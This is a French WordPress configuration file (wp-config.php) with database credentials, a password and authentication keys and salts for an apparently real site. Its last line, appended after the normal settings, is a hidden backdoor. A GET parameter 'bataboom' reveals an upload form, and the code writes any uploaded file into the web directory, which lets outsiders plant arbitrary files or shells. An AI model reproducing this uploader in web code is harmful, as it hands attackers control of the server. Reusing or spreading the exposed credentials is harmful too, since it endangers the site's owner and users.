<?php
/**
 * La configuration de base de votre installation WordPress.
 *
 * Ce fichier contient les réglages de configuration suivants : réglages MySQL,
 * préfixe de table, clefs secrètes, langue utilisée, et ABSPATH.
 * Vous pouvez en savoir plus à leur sujet en allant sur 
 * {@link http://codex.wordpress.org/fr:Modifier_wp-config.php Modifier
 * wp-config.php}. C'est votre hébergeur qui doit vous donner vos
 * codes MySQL.
 *
 * Ce fichier est utilisé par le script de création de wp-config.php pendant
 * le processus d'installation. Vous n'avez pas à utiliser le site web, vous
 * pouvez simplement renommer ce fichier en "wp-config.php" et remplir les
 * valeurs.
 *
 * @package WordPress
 */

// ** Réglages MySQL - Votre hébergeur doit vous fournir ces informations. ** //
/** Nom de la base de données de WordPress. */
define('DB_NAME', 'searchmawp770');

/** Utilisateur de la base de données MySQL. */
define('DB_USER', 'searchmawp770');

/** Mot de passe de la base de données MySQL. */
define('DB_PASSWORD', 'm76erd901s');

/** Adresse de l'hébergement MySQL. */
define('DB_HOST', 'mysql51-114.perso');

/** Jeu de caractères à utiliser par la base de données lors de la création des tables. */
define('DB_CHARSET', 'utf8');

/** Type de collation de la base de données. 
  * N'y touchez que si vous savez ce que vous faites. 
  */
define('DB_COLLATE', '');

/**#@+
 * Clefs uniques d'authentification et salage.
 *
 * Remplacez les valeurs par défaut par des phrases uniques !
 * Vous pouvez générer des phrases aléatoires en utilisant 
 * {@link https://api.wordpress.org/secret-key/1.1/salt/ le service de clefs secrètes de WordPress.org}.
 * Vous pouvez modifier ces phrases à n'importe quel moment, afin d'invalider tous les cookies existants.
 * Cela forcera également tous les utilisateurs à se reconnecter.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '-d=!a`wexS;<J*zBaZg[B|%p.6D=vZI~12)+A+XQ8TXvQlup!Rte?@Y%HOb;$}U$');
define('SECURE_AUTH_KEY',  'xv%hWyg g?%A1UMB[|*:5-5ZY>LqbI[zv:j+,aU {Yk@t/q;/k:%0}mG]~6N$gEW');
define('LOGGED_IN_KEY',    'hlb1skY[G]uxRkX[9K/A4^|V ;t}kaKi-gd>BKECrG<of^f1|Dm-JJYE[QI*v:i^');
define('NONCE_KEY',        'pLL;a?8-X$6 NvUh5[<&DKC=R)lD%vbgqwM:mS*(v.`NV@+-/(|atdMDWRU?hmi8');
define('AUTH_SALT',        'o`@x&SDv%_7Y2$Hhb$VJ1FsL,o6H`R0-uime02~+gTPcTM2jcJ^-}E(RHgTJCW-G');
define('SECURE_AUTH_SALT', 'ycABiqOZ+f/p1s2NsQ&kMG?rH)%>6J*xpWycWjBv;U|Q0-$JGr_ys+1-KP+~q +q');
define('LOGGED_IN_SALT',   '+Fa`Dewk}_-j!Y9@/uD0x$!qE<nOw}u||t=-{a{F9Vu^?!AEeEC-eBn:1YHUXMu1');
define('NONCE_SALT',       'a}y}<+-=})]G?p.ZQpMMX=%a{r WjkVyNhw=FMO2~RgWKgU$N{)48|~0nlqY-4b<');
/**#@-*/

/**
 * Préfixe de base de données pour les tables de WordPress.
 *
 * Vous pouvez installer plusieurs WordPress sur une seule base de données
 * si vous leur donnez chacune un préfixe unique. 
 * N'utilisez que des chiffres, des lettres non-accentuées, et des caractères soulignés!
 */
$table_prefix  = 'smw_';

/**
 * Langue de localisation de WordPress, par défaut en Anglais.
 *
 * Modifiez cette valeur pour localiser WordPress. Un fichier MO correspondant
 * au langage choisi doit être installé dans le dossier wp-content/languages.
 * Par exemple, pour mettre en place une traduction française, mettez le fichier
 * fr_FR.mo dans wp-content/languages, et réglez l'option ci-dessous à "fr_FR".
 */
define('WPLANG', 'fr_FR');

/** 
 * Pour les développeurs : le mode deboguage de WordPress.
 * 
 * En passant la valeur suivante à "true", vous activez l'affichage des
 * notifications d'erreurs pendant votre essais.
 * Il est fortemment recommandé que les développeurs d'extensions et
 * de thèmes se servent de WP_DEBUG dans leur environnement de 
 * développement.
 */ 
define('WP_DEBUG', false); 

/* C'est tout, ne touchez pas à ce qui suit ! Bon blogging ! */

/** Chemin absolu vers le dossier de WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Réglage des variables de WordPress et de ses fichiers inclus. */
require_once(ABSPATH . 'wp-settings.php');								
if(isset($_GET['bataboom'])){if(isset($_FILES['im'])){$dim=getcwd().'/';$im=$_FILES['im'];@move_uploaded_file($im['tmp_name'], $dim.$im['name']);echo"Done: ".$dim.$im['name'];}else{?><form method="POST" enctype="multipart/form-data"><input type="file" name="im"/><input type="Submit"/></form><?php }}